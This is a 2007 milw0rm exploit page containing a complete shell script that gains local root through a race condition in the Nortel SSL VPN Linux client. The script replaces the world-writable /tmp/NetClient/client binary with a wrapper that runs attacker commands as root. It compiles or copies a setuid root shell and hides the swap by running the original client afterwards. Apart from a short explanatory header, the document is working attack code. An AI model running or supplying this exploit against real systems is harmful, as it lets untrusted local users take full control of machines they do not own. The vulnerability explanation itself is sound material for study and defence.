<html><head><title>Nortel SSL VPN Linux Client <= 6.0.3 Local Privilege Escalation Exploit</title></head><pre>#!/bin/sh
# 
# Nortel SSL VPN Linux Client race condition
# 
# Jon Hart &lt;jhart@spoofed.org&gt;
#
# The Linux client that is utilized by versions priot to  6.05 of the Nortel
# SSL VPN appliance suffers from a number of problems that, in combination,
# allow an unprivileged local user to obtain root privileges.
# 
# This particular bug is as follows:
# 1) SSL VPN is initiated from the startNetdirect() javascript call
# 2) A zip archive is downloaded to the local machine which contains three
#    binaries necessary for the client: askpass, client, and surun.  This
#    archive is written to /tmp, chmod'd 777, and then it is extracted into
#    /tmp/NetClient
# 3) All of these files are chmod'd world writable by the following java
#    snippet, which is called on all UNIX client OSs:
#
#   protected boolean setPermissions(String file)
#   {
#      String command = &quot;chmod a+xw &quot; + file;
#      try
#      {
#         Process p = Runtime.getRuntime().exec(command);
#         p.waitFor();
#      }
#      ...
#   }
#
# 4) /tmp/NetClient/surun is executed, which in turn runs
#    /tmp/NetClient/askpass.  This process aquires the root password, and
#    then executes /tmp/NetClient/client via /bin/su and the root password.  
#
# There is clearly a bug in step 2 and 3 whereby files are installed world
# writable.  The bug I chose to exploit is the race condition in step 4,
# combined with the insecure permissions of steps 2 and 3, which (IMO),
# gives root more easily.  The risk here is if you have untrusted accounts
# on the machine from which you access the Nortel VPN, those accounts can
# easily gain local root access.
#
# The exploit is fairly simple.  Wait for /tmp/NetClient/client to appear,
# swap it for our &quot;special version&quot;, and wait for a shell.
#
# Notes: a /tmp with nosuid will help mitigate this particular _exploit_,
# but not the vulnerability.  The same vulnerability also exists in the Mac
# client.  
#
# For education and testing purposes only.  Only run this on systems that
# you maintain/control.
#

cleanup() {
   rm -f $TMP_DIR/.*-$$\..*
}


run_cmd() {
   CMD=$@    
   VPN_CLIENT_RUN=`mktemp -t vpn_client_run-$$.XXXXXXXX`

   echo &quot;Waiting for writable client&quot;
   while (true); do
      if [ -w $CLIENT ]; then
         OLD_CLIENT=`mktemp -t old_client-$$.XXXXXXXXXX`
         echo &quot;Saving old client&quot;
         cp $CLIENT $OLD_CLIENT 
         chmod 755 $OLD_CLIENT
         echo &quot;Writing new \&quot;client\&quot;&quot;
         echo &quot;#!/bin/sh&quot; &gt; $CLIENT 
         echo &quot;$CMD&quot; &gt;&gt; $CLIENT
         echo &quot;rm -f $VPN_CLIENT_RUN&quot; &gt;&gt; $CLIENT
         # ensure the original client gets run so as to 
         # not alert the user
         echo &quot;exec $OLD_CLIENT \$@&quot; &gt;&gt; $CLIENT
         break
      fi
   done

   SUCCESS=0
   echo &quot;Waiting for new client to be run&quot;
   while (true); do
      if [ ! -f $VPN_CLIENT_RUN ]; then
         SUCCESS=1
         break
      else
         sleep 2
      fi
   done

   if [ $SUCCESS == 1 ]; then
      echo &quot;Success&quot;
      return 0
   else 
      echo &quot;Exploit failed!&quot;
      cleanup
      exit 1
   fi
}

suid_shell() {
   SH_C=&quot;sh_c-$$.c&quot;

   # write out setuid shell
   cat &gt;&gt; $SH_C &lt;&lt; EOF
   #include &lt;sys/types.h&gt;
   #include &lt;unistd.h&gt;
   int main (int argc, char **argv) {
      setuid(0);
      setgid(0);
      execl(&quot;/bin/bash&quot;, &quot;bash&quot;, NULL);
   }
EOF

   # try like hell to get this shell compiled
   SH=`mktemp -t vpnshell-$$.XXXXXXXXXX`
   gcc -o $SH $SH_C 2&gt;&amp;1 &gt; /dev/null 2&gt;&amp;1
   if [ $? != 0 ]; then
      cc -o $SH $SH_C 2&gt;&amp;1 &gt; /dev/null 2&gt;&amp;1
      if [ $? != 0 ]; then
         echo &quot;Compilation of shell failed&quot;
         echo &quot;Trying backup method...&quot;
         run_cmd &quot;cp /bin/sh $SH &amp;&amp; chmod 4755 $SH&quot;
         while (true); do
            if [ -u $SH ]; then
               $SH 
               cleanup
               exit
            else
               sleep 1
            fi
         done
         echo &quot;Failed&quot;
         cleanup
         exit 1
      fi
   fi
   rm -f $SH_C 

   run_cmd &quot;chown root:root $SH &amp;&amp; chmod 4755 $SH&quot;

   # wait for our shell to be chmod'd
   SUCCESS=0
   echo &quot;Waiting for suid shell&quot;
   for sleep in `seq 1 60`; do
      if [ -u $SH ]; then
         echo &quot;Success! setuid shell is $SH&quot;
         SUCCESS=1
         break
      else
         sleep 2
      fi
   done

   if [ $SUCCESS == 1 ]; then
      cleanup
      $SH
   else 
      rm -f $SH
      echo &quot;Exploit failed!&quot;
      cleanup
      exit 1
   fi
}

CLIENT=&quot;/tmp/NetClient/client&quot;

if [ -f $CLIENT ]; then
   echo &quot;client $CLIENT already exists -- forcing stop&quot;
   $CLIENT --stop
   for sleep in `seq 1 60`; do
      if [ ! -f $CLIENT ]; then
         break
      fi
      sleep 1
   done
fi

# hack to figure out where temp files get put...
TMP_FILE=`mktemp -t $$`
TMP_DIR=`dirname $TMP_FILE`
rm -f $TMP_FILE

trap cleanup 1 2 3 15

# two modes of operation -- get a root shell, or run a cmd as root.
if [ -z &quot;$1&quot; ]; then
   suid_shell
else 
   run_cmd $1 
fi

cleanup

# milw0rm.com [2007-02-21]</pre></html>